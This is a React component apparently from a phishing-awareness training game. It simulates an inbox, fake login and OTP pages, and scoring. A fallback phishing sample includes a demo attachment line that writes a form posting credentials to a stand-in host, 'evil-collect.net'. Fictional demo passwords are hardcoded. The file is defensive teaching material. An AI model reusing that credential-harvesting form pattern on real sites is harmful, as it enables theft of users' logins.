import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { Link, useNavigate, useParams } from 'react-router-dom'
import Draggable from 'react-draggable'
import { ArrowLeft, Network, ShieldAlert } from 'lucide-react'
import * as scenarioService from '../../services/scenarioService.js'
import * as sessionService from '../../services/sessionService.js'
import FakeBrowserWindow from './playModes/FakeBrowserWindow.jsx'
import FakeZaloPanel from './playModes/FakeZaloPanel.jsx'
import OtpChallengePanel, { MIN_OTP_LEN } from './playModes/OtpChallengePanel.jsx'
import MailAttachmentSimulator from './MailAttachmentSimulator.jsx'
import PhoneOtpWidget from './playModes/PhoneOtpWidget.jsx'
import { GameStateProvider, useGameState } from './state/GameStateContext.jsx'
import { normalizeScenarioContent } from './utils/contentSchema.js'
import DebriefOverlayPanel from './DebriefOverlayPanel.jsx'
import TeachableMomentOverlay from './TeachableMomentOverlay.jsx'
import { AppWindow, DesktopEnvironment } from './windows/DesktopShell.jsx'
import GmailWindow from './windows/GmailWindow.jsx'

const SCORE_CORRECT = 120
const SCORE_FALSE_REPORT = 120
const WEB_CREDENTIALS = {
  FACEBOOK: { user: 'admin_fanpage@cybershield.vn', pass: 'fb@admin2026' },
  GOOGLE: { user: 'data_share@cybershield.vn', pass: 'drive_secure_99!' },
  GITHUB: { user: 'dev_lead@cybershield.vn', pass: 'Git!P@ss2026' },
  MICROSOFT: { user: 'nhanvien@cybershield.vn', pass: 'Ms365@Office!' },
  FINANCE: { user: 'ketoan01', pass: 'K3t0an@2026' },
}
const WEB_LABELS = {
  FACEBOOK: { name: 'Facebook Fanpage', url: 'facebook.com/cybershield' },
  GOOGLE: { name: 'Google Drive (Dữ liệu chung)', url: 'drive.google.com' },
  GITHUB: { name: 'GitHub (Mã nguồn)', url: 'github.com' },
  MICROSOFT: { name: 'Microsoft 365 (Email/Teams)', url: 'login.microsoftonline.com' },
  FINANCE: { name: 'Hệ thống Kế toán (Nội bộ)', url: 'finance.cybershield.internal' },
}

function resolveWebTypeFromEmail(email, fallbackType) {
  const direct = String(email?.webType || '').toUpperCase().trim()
  if (direct && WEB_CREDENTIALS[direct]) return direct
  const token = `${email?.linkUrl || ''} ${email?.senderEmail || ''} ${email?.subject || ''}`.toLowerCase()
  if (token.includes('facebook')) return 'FACEBOOK'
  if (token.includes('google') || token.includes('drive')) return 'GOOGLE'
  if (token.includes('github')) return 'GITHUB'
  if (token.includes('finance') || token.includes('ketoan')) return 'FINANCE'
  if (token.includes('microsoft') || token.includes('office') || token.includes('outlook')) return 'MICROSOFT'
  const fallback = String(fallbackType || 'MICROSOFT').toUpperCase().trim()
  return WEB_CREDENTIALS[fallback] ? fallback : 'MICROSOFT'
}

function playStampTone(isDanger) {
  try {
    const ctx = new window.AudioContext()
    const osc = ctx.createOscillator()
    const gain = ctx.createGain()
    osc.type = 'square'
    osc.frequency.value = isDanger ? 175 : 420
    gain.gain.value = 0.09
    osc.connect(gain)
    gain.connect(ctx.destination)
    osc.start()
    osc.stop(ctx.currentTime + 0.09)
  } catch {
    // best-effort audio feedback
  }
}

function buildQueueBySession(lesson, campaignTitle) {
  const threat = Math.max(1, Math.min(5, Number(lesson?.threatLevel) || 1))
  const lessonTitle = lesson?.lessonTitle || 'Bài học mô phỏng'
  const objective = lesson?.objective || 'Kiểm tra người gửi, ngữ cảnh và đường link.'
  const topic = lessonTitle.replace(/^Bài\s*\d+:\s*/i, '')

  const safe = {
    id: `${lesson?.sessionId}-safe`,
    senderName: 'HR Department',
    senderEmail: 'hr@cybershield-academy.internal',
    subject: `Thông báo nội bộ: ${topic}`,
    body: `Xin chào,\n\nNội dung hôm nay: ${objective}\n\nVui lòng theo dõi lịch học trên cổng nội bộ.`,
    linkLabel: 'Mở cổng đào tạo nội bộ',
    linkUrl: 'https://intranet.cybershield-academy.internal/training',
    isPhishing: false,
    redFlags: [],
  }

  const phishing = {
    id: `${lesson?.sessionId}-phish`,
    senderName: 'HR Department',
    senderEmail: `hr-admin@freemail-xyz.com`,
    subject: `Gấp: Cập nhật hồ sơ nhân sự cho ${campaignTitle}`,
    body: `Kính gửi nhân viên,\n\nBạn cần xác minh hồ sơ trong vòng 10 phút để tránh khóa tài khoản.\n\nBấm vào nút dưới để hoàn tất ngay.`,
    linkLabel: 'Đổi mật khẩu',
    linkUrl: `http://phishing-site.net/login?t=${threat}&sid=${lesson?.sessionId}`,
    isPhishing: true,
    redFlags: [
      'Tên hiển thị giống nội bộ nhưng domain người gửi là freemail.',
      'Yêu cầu hành động gấp để tạo áp lực tâm lý.',
      'Link đích là HTTP và domain ngoài hệ thống.',
    ],
    attachmentJson: JSON.stringify({
      fileName: 'VerifyAccount.js',
      mimeLabel: 'JavaScript',
      viewerTitle: 'Notepad — nội dung file (fallback demo)',
      content:
        '// Auto-verify script (mô phỏng)\ndocument.write("<form action=\\"http://evil-collect.net/creds\\">");\n// Luôn mở file trước khi tin — kể cả khi URL/sender trông ổn.',
      fileWarnings: [
        'File .js gửi form tới domain lạ',
        'Mã có thể độc hại dù link trong email trông giống thật',
      ],
    }),
  }

  const safe2 = {
    id: `${lesson?.sessionId}-safe2`,
    senderName: 'IT Helpdesk',
    senderEmail: 'helpdesk@cybershield-academy.internal',
    subject: `Checklist bảo mật - ${topic}`,
    body: `Mẹo nhanh: luôn hover link trước khi click.\nKhông chia sẻ OTP, mật khẩu qua email/chat.`,
    linkLabel: 'Xem Security Handbook',
    linkUrl: 'https://intranet.cybershield-academy.internal/handbook',
    isPhishing: false,
    redFlags: [],
  }

  return threat >= 3 ? [safe, phishing, safe2] : [safe, safe2, phishing]
}

function mapApiInboxToQueue(rows) {
  if (!Array.isArray(rows)) return []
  return rows.map((row) => ({
    id: row.id,
    senderName: row.senderName || '',
    senderEmail: row.senderEmail,
    subject: row.subject,
    body: row.body,
    linkUrl: row.linkUrl,
    linkLabel: row.linkLabel || 'Link',
    isPhishing: Boolean(row.isPhishing),
    redFlags: row.redFlags || [],
    slotTag: row.slotTag,
    sortOrder: row.sortOrder,
    attachmentJson: row.attachmentJson || null,
  }))
}

function SurvivalInboxScreen() {
  const { sessionId: stepId } = useParams()
  const navigate = useNavigate()
  const { state: gameState, actions: gameActions } = useGameState()
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState('')
  const [campaignTitle, setCampaignTitle] = useState('Chiến dịch huấn luyện')
  const [scenarioRouteId, setScenarioRouteId] = useState('')
  const [lesson, setLesson] = useState(null)
  const [queue, setQueue] = useState([])
  const [index, setIndex] = useState(0)
  const [score, setScore] = useState(0)
  const scoreRef = useRef(0)
  const [status, setStatus] = useState('PLAYING')
  const [senderTooltipOpen, setSenderTooltipOpen] = useState(false)
  const [hoveredUrl, setHoveredUrl] = useState('')
  const [gameOverEmail, setGameOverEmail] = useState(null)
  const [gameOverNonMail, setGameOverNonMail] = useState(false)
  const [playContext, setPlayContext] = useState(null)
  const [zaloReply, setZaloReply] = useState('')
  const [openedAttachmentIds, setOpenedAttachmentIds] = useState([])
  const [attachmentModalOpen, setAttachmentModalOpen] = useState(false)
  const [isShaking, setIsShaking] = useState(false)
  const [decisionHistory, setDecisionHistory] = useState([])
  const [startedAtMs, setStartedAtMs] = useState(() => Date.now())
  const [isFinished, setIsFinished] = useState(false)
  const [isSubmittingResult, setIsSubmittingResult] = useState(false)
  const [debriefData, setDebriefData] = useState(null)
  const hasSubmittedRef = useRef(false)
  const pendingTrapDecisionRef = useRef(null)
  const deferredDebriefRef = useRef(null)
  /** MAIL_OTP: cặp OTP nhập / đúng tại thời điểm gửi trap (state cuối email có thể sai khi nộp bài). */
  const mailOtpSnapshotRef = useRef(null)
  const otpTrapBusyRef = useRef(false)
  const [otpTrapBusy, setOtpTrapBusy] = useState(false)
  const webTrapSubmittedEmailRef = useRef(null)
  const [webTrapBusy, setWebTrapBusy] = useState(false)
  const [scenarioModel, setScenarioModel] = useState(null)
  const [browserUser, setBrowserUser] = useState('')
  const [browserPass, setBrowserPass] = useState('')
  const [browserOtp, setBrowserOtp] = useState('')
  const [generatedOtp, setGeneratedOtp] = useState('')
  const [activeApp, setActiveApp] = useState('mail')
  const mailWindowNodeRef = useRef(null)
  const notepadWindowNodeRef = useRef(null)
  const chatWindowNodeRef = useRef(null)
  const browserWindowNodeRef = useRef(null)

  const currentEmail = queue[index] ?? null
  const attachmentSpec = useMemo(() => {
    if (!currentEmail?.attachmentJson) return null
    try {
      return JSON.parse(currentEmail.attachmentJson)
    } catch {
      return null
    }
  }, [currentEmail?.attachmentJson])
  const scenarioType = scenarioModel?.scenarioType || 'MAIL_STANDARD'
  const isMailOtpScenario = scenarioType === 'MAIL_OTP'
  const isCurrentEmailOtpScenario = useMemo(() => {
    if (!isMailOtpScenario || !currentEmail) return false
    const formFromModel = String(scenarioModel?.traps?.browser?.formType || '').toUpperCase()
    const formFromTrap = String(gameState.trap.browserFormType || '').toUpperCase()
    if (formFromModel === 'OTP' || formFromTrap === 'OTP') return true
    const tag = String(currentEmail.slotTag || '').toUpperCase()
    if (tag.includes('OTP')) return true
    return isMailOtpScenario
  }, [
    currentEmail,
    gameState.trap.browserFormType,
    isMailOtpScenario,
    scenarioModel?.traps?.browser?.formType,
  ])
  const showPhoneOtpPreview =
    gameState.ui.isBrowserOpen &&
    isCurrentEmailOtpScenario &&
    gameState.ui.isPhoneWidgetVisible
  const appWindowTitle = 'Inbox - hr.department@company.com - Google Chrome'
  const completedCount = Math.min(Math.max(index, decisionHistory.length), queue.length)
  const queueLen = queue.length
  const progressPct = queue.length ? Math.round((completedCount / queue.length) * 100) : 0
  const threatLevel = lesson?.threatLevel ?? 1
  const canAct = status === 'PLAYING' && !!currentEmail
  const canVerifyMail =
    canAct &&
    (!attachmentSpec ||
      openedAttachmentIds.some((id) => String(id) === String(currentEmail?.id)))
  const canTrustBrowserTrap = isMailOtpScenario
    ? browserOtp.trim().length >= MIN_OTP_LEN && !otpTrapBusy
    : browserUser.trim().length > 0 && browserPass.trim().length > 0 && !webTrapBusy
  const activeWebType = useMemo(
    () => resolveWebTypeFromEmail(currentEmail, scenarioModel?.traps?.browser?.webType),
    [currentEmail, scenarioModel?.traps?.browser?.webType],
  )
  const notepadContent = useMemo(() => {
    const credential = WEB_CREDENTIALS[activeWebType] || WEB_CREDENTIALS.MICROSOFT
    const label = WEB_LABELS[activeWebType] || WEB_LABELS.MICROSOFT
    return `// Passwords.txt (Nội bộ)
Mục tiêu hiện tại: ${label.name}
URL: ${label.url}
User: ${credential.user}
Pass: ${credential.pass}

---
Các tài khoản khác:
Facebook: admin_fanpage@cybershield.vn / fb@admin2026
Google: data_share@cybershield.vn / drive_secure_99!
GitHub: dev_lead@cybershield.vn / Git!P@ss2026
Microsoft: nhanvien@cybershield.vn / Ms365@Office!
Finance: ketoan01 / K3t0an@2026`
  }, [activeWebType])
  const notepadDefaultPosition = useMemo(() => {
    if (typeof window === 'undefined') return { x: 860, y: 20 }
    return { x: Math.max(0, window.innerWidth - 300), y: 20 }
  }, [])

  const appendTrapVerifiedDecision = useCallback(() => {
    const rawId = currentEmail?.id
    const emailId =
      typeof rawId === 'number' ? rawId : Number.parseInt(String(rawId), 10) || index + 1
    const decision = {
      emailId,
      isPhishing: true,
      userAction: 'VERIFIED',
    }
    pendingTrapDecisionRef.current = decision
    setDecisionHistory((prev) => {
      if (
        prev.some(
          (item) => String(item.emailId) === String(decision.emailId) && item.userAction === decision.userAction,
        )
      ) {
        return prev
      }
      return [...prev, decision]
    })
    gameActions.commitDecision('VERIFIED')
  }, [currentEmail?.id, gameActions, index])

  const loadBySessionId = useCallback(async () => {
    hasSubmittedRef.current = false
    pendingTrapDecisionRef.current = null
    otpTrapBusyRef.current = false
    webTrapSubmittedEmailRef.current = null
    setOtpTrapBusy(false)
    setWebTrapBusy(false)
    if (!stepId) {
      setError('Thiếu stepId trên URL.')
      setIsLoading(false)
      return
    }
    try {
      setIsLoading(true)
      setError('')
      setSenderTooltipOpen(false)
      setHoveredUrl('')
      const { data: scenarios } = await scenarioService.getScenarios()
      let foundScenario = null
      let foundLesson = null

      for (const scenario of Array.isArray(scenarios) ? scenarios : []) {
        const { data: lessons } = await sessionService.fetchSessionsByScenario(scenario.id)
        const matched = Array.isArray(lessons)
          ? lessons.find((x) => String(x.sessionId) === String(stepId))
          : null
        if (matched) {
          foundScenario = scenario
          foundLesson = matched
          break
        }
      }
      if (!foundLesson) throw new Error('Không tìm thấy session hợp lệ cho màn chơi.')

      setCampaignTitle(foundScenario?.title || 'Chiến dịch huấn luyện')
      setScenarioRouteId(foundScenario?.id ? String(foundScenario.id) : '')
      setLesson(foundLesson)

      let playCtx = {
        stepType: 'MAIL',
        content: null,
        phishingScenario: false,
        landing: null,
      }
      try {
        const ctxRes = await sessionService.fetchPlayContext(stepId)
        if (ctxRes?.data) {
          playCtx = { ...playCtx, ...ctxRes.data }
        }
      } catch {
        // Giữ mặc định MAIL nếu API lỗi.
      }
      setPlayContext(playCtx)

      const stepTypeNorm = (playCtx.stepType || 'MAIL').toString().toUpperCase()
      let nextQueue = []
      try {
        const inboxRes = await sessionService.fetchInboxEmailsForStep(stepId)
        nextQueue = mapApiInboxToQueue(inboxRes.data)
      } catch {
        nextQueue = []
      }
      if (nextQueue.length === 0) {
        nextQueue = buildQueueBySession(foundLesson, foundScenario?.title || 'CyberShield')
      }
      setQueue(nextQueue)
      const normalized = normalizeScenarioContent({
        stepType: stepTypeNorm,
        content: playCtx.content,
        queue: nextQueue,
      })
      setScenarioModel(normalized)
      gameActions.reset({
        isZaloActive: normalized.traps.zalo.enabled,
        isPhoneWidgetVisible: normalized.traps.otp.enabled,
      })
      setIndex(0)
      setScore(0)
      scoreRef.current = 0
      setStatus('PLAYING')
      setGameOverEmail(null)
      setGameOverNonMail(false)
      setOpenedAttachmentIds([])
      setAttachmentModalOpen(false)
      setDecisionHistory([])
      setZaloReply('')
      setStartedAtMs(Date.now())
      setIsFinished(false)
      setIsSubmittingResult(false)
      setDebriefData(null)
      setBrowserUser('')
      setBrowserPass('')
      setBrowserOtp('')
      setGeneratedOtp('')
      setActiveApp('mail')
    } catch (err) {
      setError(err?.response?.data?.message || err?.message || 'Không thể nạp dữ liệu màn chơi.')
      setScenarioRouteId('')
      setQueue([])
      setLesson(null)
      setPlayContext(null)
      setScenarioModel(null)
    } finally {
      setIsLoading(false)
    }
  }, [stepId])

  useEffect(() => {
    loadBySessionId()
  }, [loadBySessionId])

  useEffect(() => {
    setAttachmentModalOpen(false)
    setBrowserUser('')
    setBrowserPass('')
    setBrowserOtp('')
    gameActions.setPhoneWidgetVisible(false)
    webTrapSubmittedEmailRef.current = null
    setWebTrapBusy(false)
    if (isMailOtpScenario && currentEmail) {
      setGeneratedOtp(Math.floor(100000 + Math.random() * 900000).toString())
      return
    }
    setGeneratedOtp('')
    // Only reset on question boundary; omit gameActions from deps (link click changes its identity and would hide the widget).
  }, [index, isMailOtpScenario, currentEmail?.id])

  const submitResult = useCallback(async (opts = {}) => {
    const deferDebrief = Boolean(opts?.deferDebrief)
    const immediateDecisions = Array.isArray(opts?.immediateDecisions) ? opts.immediateDecisions : []
    if (!stepId || isSubmittingResult) return
    try {
      setIsSubmittingResult(true)
      const timeTakenSeconds = Math.max(1, Math.round((Date.now() - startedAtMs) / 1000))
      const st = (playContext?.stepType || 'MAIL').toString().toUpperCase()
      const baseHistory = decisionHistory
      const mergedHistory = [...baseHistory]
      for (const d of immediateDecisions) {
        if (!d) continue
        if (mergedHistory.some((x) => String(x?.emailId ?? '') === String(d?.emailId ?? '') && x?.userAction === d?.userAction)) {
          continue
        }
        mergedHistory.push(d)
      }
      if (pendingTrapDecisionRef.current) {
        const pending = pendingTrapDecisionRef.current
        if (
          !mergedHistory.some(
            (item) => String(item?.emailId ?? '') === String(pending?.emailId ?? '') && item?.userAction === pending?.userAction,
          )
        ) {
          mergedHistory.push(pending)
        }
      }
      const finalEmailDecisions = mergedHistory
      const payload = {
        finalScore: scoreRef.current,
        timeTakenSeconds,
      }
      const canMapToEmailDecisions = finalEmailDecisions.length > 0
      if (st === 'MAIL_OTP') {
        const snap = mailOtpSnapshotRef.current
        const otpEntered = snap?.entered != null ? snap.entered : browserOtp.trim()
        const otpExpected = snap?.expected != null ? snap.expected : generatedOtp
        payload.emailDecisions = finalEmailDecisions.map((decision) => {
          const row = {
            emailId: decision.emailId,
            isPhishing: decision.isPhishing,
            userAction: decision.userAction,
          }
          if (decision.payload != null || decision.expectedPayload != null) {
            row.payload = decision.payload
            row.expectedPayload = decision.expectedPayload
          } else if (
            snap &&
            decision.userAction === 'VERIFIED' &&
            String(decision.emailId) === String(snap.emailId)
          ) {
            row.payload = otpEntered
            row.expectedPayload = otpExpected
          }
          return row
        })
        payload.gameplayDecisions = [
          {
            decisionType: 'OTP_SUBMIT',
            userAction: 'OTP_SUBMIT',
            isPhishing: false,
            payload: otpEntered,
            expectedPayload: otpExpected,
          },
        ]
      } else if (st === 'MAIL' || canMapToEmailDecisions) {
        payload.emailDecisions = finalEmailDecisions.map((decision) => {
          const row = {
            emailId: decision.emailId,
            isPhishing: decision.isPhishing,
            userAction: decision.userAction,
          }
          if (decision.payload != null) row.payload = decision.payload
          if (decision.expectedPayload != null) row.expectedPayload = decision.expectedPayload
          return row
        })
      } else {
        const normalizedType =
          st === 'WEB_PAGE' ? 'BROWSER_VERDICT' : st === 'OTP' ? 'OTP_SUBMIT' : 'ZALO_VERDICT'
        payload.gameplayDecisions = mergedHistory.map((decision) => ({
          decisionType: normalizedType,
          userAction: decision.userAction,
          isPhishing: decision.isPhishing,
          payload:
            st === 'OTP'
              ? browserOtp.trim() || generatedOtp || undefined
              : undefined,
        }))
      }
      const { data } = await sessionService.submitGameplayStep(stepId, payload)
      const report = {
        ...data,
        timeTakenSeconds,
        finalScore: scoreRef.current,
      }
      if (deferDebrief) {
        deferredDebriefRef.current = report
      } else {
        setDebriefData(report)
      }
    } catch (err) {
      const errorMessage = err?.response?.data?.message || err?.message || 'Lỗi không xác định'
      const report = {
        earnedExp: 0,
        totalExp: 0,
        isPassed: false,
        feedbackMessages: [
          `[LỖI KẾT NỐI] Không thể nộp bài. Chi tiết: ${errorMessage}`,
          '[HỆ THỐNG] Lỗi API (403 Forbidden). Hãy kiểm tra JWT Token. Vui lòng F5 lại trang.',
        ],
        timeTakenSeconds: Math.max(1, Math.round((Date.now() - startedAtMs) / 1000)),
        finalScore: scoreRef.current,
      }
      if (deferDebrief) {
        deferredDebriefRef.current = report
      } else {
        setDebriefData(report)
      }
    } finally {
      pendingTrapDecisionRef.current = null
      setIsSubmittingResult(false)
    }
  }, [
    browserOtp,
    decisionHistory,
    generatedOtp,
    isSubmittingResult,
    playContext?.stepType,
    startedAtMs,
    stepId,
  ])

  useEffect(() => {
    if (isFinished && !hasSubmittedRef.current) {
      hasSubmittedRef.current = true
      submitResult()
    }
  }, [isFinished, submitResult])

  useEffect(() => {
    if (status !== 'GAME_OVER') return
    if (gameOverEmail || gameOverNonMail) return
    if (gameState.trap.isPhished) {
      setGameOverNonMail(true)
      return
    }
    if (currentEmail?.isPhishing) {
      setGameOverEmail(currentEmail)
      setGameOverNonMail(true)
    }
  }, [currentEmail, gameOverEmail, gameOverNonMail, gameState.trap.isPhished, status])

  const handleCloseBrowser = useCallback(() => {
    gameActions.setPhoneWidgetVisible(false)
    gameActions.closeBrowser()
    setGeneratedOtp('')
  }, [gameActions])

  const handleEmailDecision = useCallback(
    (action) => {
      if (!canAct) return
      const isReport = action === 'QUARANTINE'
      const isVerified = action === 'VERIFIED'
      if (!isReport && !isVerified) return
      if (
        isVerified &&
        attachmentSpec &&
        !openedAttachmentIds.some((id) => String(id) === String(currentEmail?.id))
      ) {
        setIsShaking(true)
        window.setTimeout(() => setIsShaking(false), 220)
        return
      }
      if (
        isVerified &&
        scenarioModel?.traps?.browser?.enabled &&
        !gameActions.getInspectedLinks().includes(`email-link-${currentEmail?.id}`)
      ) {
        setIsShaking(true)
        window.setTimeout(() => setIsShaking(false), 220)
        return
      }
      setSenderTooltipOpen(false)
      setHoveredUrl('')
      setIsShaking(true)
      playStampTone(isReport)

      window.setTimeout(() => {
        const rawId = currentEmail?.id
        const emailId =
          typeof rawId === 'number' ? rawId : Number.parseInt(String(rawId), 10) || index + 1
        const decision = {
          emailId,
          isPhishing: Boolean(currentEmail?.isPhishing),
          userAction: action,
        }
        gameActions.commitDecision(decision.userAction)
        setDecisionHistory((prev) => [...prev, decision])

        const trustPhishing = isVerified && currentEmail?.isPhishing
        if (trustPhishing) {
          setStatus('GAME_OVER')
          setGameOverEmail(currentEmail)
          setGameOverNonMail(false)
          setIsFinished(false)
          setIsShaking(false)
          return
        }

        const correct = (isReport && currentEmail?.isPhishing) || (isVerified && !currentEmail?.isPhishing)
        const nextScore = scoreRef.current + (correct ? SCORE_CORRECT : -SCORE_FALSE_REPORT)
        scoreRef.current = nextScore
        setScore(nextScore)

        const nextIndex = index + 1
        if (nextIndex >= queue.length) {
          setStatus(nextScore < 0 ? 'GAME_OVER' : 'VICTORY')
          if (nextScore < 0) {
            setGameOverEmail(null)
          }
          setIsFinished(true)
        } else {
          setIndex(nextIndex)
        }
        setIsShaking(false)
      }, 170)
    },
    [
      attachmentSpec,
      canAct,
      currentEmail,
      gameActions,
      index,
      openedAttachmentIds,
      queue.length,
      scenarioModel?.traps?.browser?.enabled,
    ],
  )

  const handleLinkClick = useCallback(
    (url) => {
      if (!currentEmail) return
      const shouldOpenBrowserTrap =
        scenarioModel?.traps?.browser?.enabled ||
        scenarioType === 'MAIL_WEB' ||
        isMailOtpScenario ||
        (Boolean(currentEmail?.isPhishing) && Boolean(url))
      if (!shouldOpenBrowserTrap) return
      if (isMailOtpScenario) {
        setGeneratedOtp(Math.floor(100000 + Math.random() * 900000).toString())
        gameActions.setPhoneWidgetVisible(true)
      }

      const trapId = `email-link-${currentEmail?.id ?? 'unknown'}`
      gameActions.markInspectedLink(trapId)
      gameActions.openBrowser({
        url: url || scenarioModel?.traps?.browser?.actualUrl || scenarioModel?.traps?.browser?.displayUrl,
        trapId,
        formType: isMailOtpScenario ? 'OTP' : scenarioModel?.traps?.browser?.formType || 'CREDENTIAL',
      })
      setActiveApp('browser')
    },
    [currentEmail, gameActions, isMailOtpScenario, scenarioModel, scenarioType],
  )

  const handleFileDownload = useCallback(
    () => {
      if (currentEmail?.id != null) {
        gameActions.markInspectedAttachment(currentEmail.id)
      }
      setAttachmentModalOpen(true)
    },
    [currentEmail?.id, gameActions],
  )

  const handleAttachmentDownload = useCallback(() => {
    setAttachmentModalOpen(false)
    if (!currentEmail) return
    if (currentEmail?.isPhishing) {
      appendTrapVerifiedDecision()
      setStatus('GAME_OVER')
      setGameOverEmail(currentEmail)
      setGameOverNonMail(true)
      setIsFinished(false)
      return
    }
    if (currentEmail?.id != null) {
      gameActions.markInspectedAttachment(currentEmail.id)
    }
    setOpenedAttachmentIds((prev) => {
      const id = currentEmail?.id
      if (id == null) return prev
      if (prev.some((x) => String(x) === String(id))) return prev
      return [...prev, id]
    })
  }, [appendTrapVerifiedDecision, currentEmail, gameActions])

  const handleReportPhishing = useCallback(() => {
    handleEmailDecision('QUARANTINE')
  }, [handleEmailDecision])

  const handleVerifyMail = useCallback(() => {
    handleEmailDecision('VERIFIED')
  }, [handleEmailDecision])

  const handleSubmitBrowserTrap = useCallback(async () => {
    if (!currentEmail) return
    const isMailWebScenario = scenarioType === 'MAIL_WEB'
    const rawId = currentEmail?.id
    const emailId =
      typeof rawId === 'number' ? rawId : Number.parseInt(String(rawId), 10) || index + 1
    if (isMailWebScenario) {
      if (webTrapSubmittedEmailRef.current === emailId) return
      webTrapSubmittedEmailRef.current = emailId
      setWebTrapBusy(true)
    }
    if (isMailOtpScenario) {
      if (otpTrapBusyRef.current) return
      otpTrapBusyRef.current = true
      setOtpTrapBusy(true)
    }

    const endMailOtpTrap = () => {
      if (isMailOtpScenario) {
        otpTrapBusyRef.current = false
        setOtpTrapBusy(false)
      }
    }

    try {
      if (isMailWebScenario) {
        const expected = WEB_CREDENTIALS[activeWebType] || WEB_CREDENTIALS.MICROSOFT
        const enteredPayload = `${browserUser.trim()}::${browserPass}`
        const expectedPayload = `${expected.user}::${expected.pass}`
        const credentialsMatch =
          browserUser.trim() === expected.user && browserPass === expected.pass
        const trustedDecision = {
          emailId,
          isPhishing: Boolean(currentEmail?.isPhishing),
          userAction: 'VERIFIED',
          payload: enteredPayload,
          expectedPayload,
        }
        setDecisionHistory((prev) => [...prev, trustedDecision])
        gameActions.commitDecision('VERIFIED')
        const delta = currentEmail?.isPhishing
          ? -SCORE_FALSE_REPORT
          : credentialsMatch
            ? SCORE_CORRECT
            : -SCORE_FALSE_REPORT
        const nextScore = scoreRef.current + delta
        scoreRef.current = nextScore
        setScore(nextScore)
        gameActions.closeBrowser()
        gameActions.setPhoneWidgetVisible(false)
        setBrowserUser('')
        setBrowserPass('')
        const nextIndex = index + 1
        if (nextIndex >= queue.length) {
          const failedByCredentials = !currentEmail?.isPhishing && !credentialsMatch
          setStatus(nextScore < 0 || failedByCredentials ? 'GAME_OVER' : 'VICTORY')
          setIsFinished(true)
        } else {
          setIndex(nextIndex)
        }
        return
      }

      if (isMailOtpScenario) {
        mailOtpSnapshotRef.current = {
          entered: browserOtp.trim(),
          expected: generatedOtp,
          emailId,
        }
      } else {
        mailOtpSnapshotRef.current = null
      }

      if (!currentEmail.isPhishing) {
        if (!isMailOtpScenario) {
          const expected = WEB_CREDENTIALS[activeWebType]
          const credentialMatch =
            !!expected &&
            browserUser.trim() === expected.user &&
            browserPass === expected.pass
          if (!credentialMatch) {
            const nextScore = scoreRef.current - SCORE_FALSE_REPORT
            scoreRef.current = nextScore
            setScore(nextScore)
            setIsShaking(true)
            window.setTimeout(() => setIsShaking(false), 220)
            return
          }
        }
        const otpMatched = browserOtp.trim() === generatedOtp
        if (!otpMatched) {
          if (isMailOtpScenario) {
            const wrongDecision = {
              emailId,
              isPhishing: false,
              userAction: 'VERIFIED',
              payload: mailOtpSnapshotRef.current?.entered,
              expectedPayload: mailOtpSnapshotRef.current?.expected,
            }
            setDecisionHistory((prev) => [...prev, wrongDecision])
            gameActions.commitDecision('VERIFIED')
            const nextScore = scoreRef.current - SCORE_FALSE_REPORT
            scoreRef.current = nextScore
            setScore(nextScore)
            setIsShaking(true)
            window.setTimeout(() => setIsShaking(false), 220)
            handleCloseBrowser()
            setBrowserOtp('')
            const nextIndex = index + 1
            if (nextIndex >= queue.length) {
              setStatus(nextScore < 0 ? 'GAME_OVER' : 'VICTORY')
              setIsFinished(true)
            } else {
              setIndex(nextIndex)
            }
            return
          }
          const nextScore = scoreRef.current - SCORE_FALSE_REPORT
          scoreRef.current = nextScore
          setScore(nextScore)
          setIsShaking(true)
          window.setTimeout(() => setIsShaking(false), 220)
          return
        }
        const trustedDecision = {
          emailId,
          isPhishing: false,
          userAction: 'VERIFIED',
          ...(isMailOtpScenario && mailOtpSnapshotRef.current
            ? {
                payload: mailOtpSnapshotRef.current.entered,
                expectedPayload: mailOtpSnapshotRef.current.expected,
              }
            : {}),
        }
        setDecisionHistory((prev) => [...prev, trustedDecision])
        gameActions.commitDecision('VERIFIED')
        handleCloseBrowser()
        setBrowserOtp('')
        const nextScore = scoreRef.current + SCORE_CORRECT
        scoreRef.current = nextScore
        setScore(nextScore)
        const nextIndex = index + 1
        if (nextIndex >= queue.length) {
          setStatus(nextScore < 0 ? 'GAME_OVER' : 'VICTORY')
          setIsFinished(true)
        } else {
          setIndex(nextIndex)
        }
        return
      }

      const phishedDecision = {
        emailId,
        isPhishing: true,
        userAction: 'VERIFIED',
        ...(isMailOtpScenario && mailOtpSnapshotRef.current
          ? {
              payload: mailOtpSnapshotRef.current.entered,
              expectedPayload: mailOtpSnapshotRef.current.expected,
            }
          : {}),
      }
      pendingTrapDecisionRef.current = phishedDecision
      setDecisionHistory((prev) => [...prev, phishedDecision])
      gameActions.commitDecision('VERIFIED')
      if (!isMailOtpScenario) {
        handleCloseBrowser()
      }
      gameActions.triggerPhished(
        isMailOtpScenario ? 'OTP_SUBMIT_ON_PHISHING_PAGE' : 'CREDENTIAL_SUBMIT_ON_PHISHING_PAGE',
      )
      setStatus('GAME_OVER')
      setGameOverEmail(currentEmail || null)
      setGameOverNonMail(true)
      setIsFinished(false)
      hasSubmittedRef.current = false
      await submitResult({ deferDebrief: true, immediateDecisions: [phishedDecision] })
      if (isMailOtpScenario) {
        handleCloseBrowser()
        setBrowserOtp('')
        setIndex((prev) => prev + 1)
      }
    } finally {
      endMailOtpTrap()
    }
  }, [
    browserOtp,
    currentEmail,
    gameActions,
    generatedOtp,
    handleCloseBrowser,
    index,
    isMailOtpScenario,
    scenarioType,
    activeWebType,
    browserUser,
    browserPass,
    queue.length,
    submitResult,
  ])

  const statusCls = useMemo(() => {
    if (status === 'GAME_OVER') return 'text-red-300'
    if (status === 'VICTORY') return 'text-emerald-300'
    return 'text-cyan-300'
  }, [status])

  return (
    <div className="min-h-screen flex flex-col bg-[#050B14] text-slate-100">
      <header className="relative z-10 h-16 border-b border-slate-700/60 bg-slate-900 text-white">
        <div className="mx-auto flex h-full w-full max-w-7xl items-center gap-2 px-4 sm:px-6">
          <Link
            to={scenarioRouteId ? `/campaign/${scenarioRouteId}/sessions` : '/campaigns'}
            className="inline-flex items-center gap-1.5 rounded-lg border border-white/10 bg-slate-800/70 px-2.5 py-1.5 text-xs font-semibold text-slate-200 hover:border-cyan-400/35 hover:text-cyan-200"
          >
            <ArrowLeft className="h-4 w-4" />
            Quay lại Chiến dịch
          </Link>
          <div className="inline-flex h-8 w-8 items-center justify-center rounded-lg border border-cyan-500/30 bg-cyan-950/50 text-cyan-200">
            <Network className="h-4 w-4" />
          </div>
